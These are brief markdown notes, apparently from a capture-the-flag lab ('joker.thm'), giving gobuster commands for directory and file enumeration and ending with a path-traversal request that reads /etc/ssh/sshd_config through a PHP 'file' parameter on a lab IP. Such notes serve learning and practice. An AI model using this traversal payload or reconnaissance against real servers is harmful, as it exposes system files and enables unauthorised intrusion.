## Gobuster rcon

##### Main commands

*Basic directory enumeration*
```
gobuster dir -u http://joker.thm -w /usr/share/dirb/wordlists/common.txt 
```

*File enumeration*
```
gobuster dir -u http://joker.thm -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip
```

```
http://10.10.23.28/secret-script.php?file=../../../etc/ssh/sshd_config
```

